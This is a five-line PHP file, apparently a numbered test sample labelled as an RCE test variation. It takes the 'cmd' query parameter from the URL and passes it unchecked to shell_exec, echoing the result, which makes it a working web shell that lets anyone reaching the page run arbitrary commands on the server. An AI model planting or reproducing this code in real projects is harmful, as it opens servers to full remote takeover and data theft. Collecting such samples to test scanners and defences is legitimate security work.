<?php
// RCE test variation #1489
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>